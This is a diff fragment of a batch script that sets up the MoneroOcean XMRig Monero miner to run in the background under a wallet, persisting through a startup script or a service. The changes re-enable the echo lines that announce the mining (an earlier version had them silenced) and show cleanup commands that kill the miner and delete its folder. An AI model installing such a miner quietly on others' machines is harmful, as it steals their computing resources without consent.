@@ -164,20 +164,20 @@ rem printing intentions
 
 set "LOGFILE=%USERPROFILE%\moneroocean\xmrig.log"
 
-rem echo I will download, setup and run in background Monero CPU miner with logs in %LOGFILE% file.
-rem echo If needed, miner in foreground can be started by %USERPROFILE%\moneroocean\miner.bat script.
-rem echo Mining will happen to %WALLET% wallet.
+echo I will download, setup and run in background Monero CPU miner with logs in %LOGFILE% file.
+echo If needed, miner in foreground can be started by %USERPROFILE%\moneroocean\miner.bat script.
+echo Mining will happen to %WALLET% wallet.
 
 if not [%EMAIL%] == [] (
-rem   echo ^(and %EMAIL% email as password to modify wallet options later at https://moneroocean.stream site^)
+echo ^(and %EMAIL% email as password to modify wallet options later at https://moneroocean.stream site^)
 )
 
-rem echo.
+echo.
 
 if %ADMIN% == 0 (
-rem   echo Since I do not have admin access, mining in background will be started using your startup directory script and only work when your are logged in this host.
+echo Since I do not have admin access, mining in background will be started using your startup directory script and only work when your are logged in this host.
 ) else (
-rem   echo Mining in background will be performed using moneroocean_miner service.
+echo Mining in background will be performed using moneroocean_miner service.
 )
 
 rem echo.
@@ -195,7 +195,7 @@ taskkill /f /t /im xmrig.exe
 
 :REMOVE_DIR0
 echo [*] Removing "%USERPROFILE%\moneroocean" directory
-timeout 5
+rem timeout 5
 rmdir /q /s "%USERPROFILE%\moneroocean" >NUL 2>NUL
 IF EXIST "%USERPROFILE%\moneroocean" GOTO REMOVE_DIR0
 
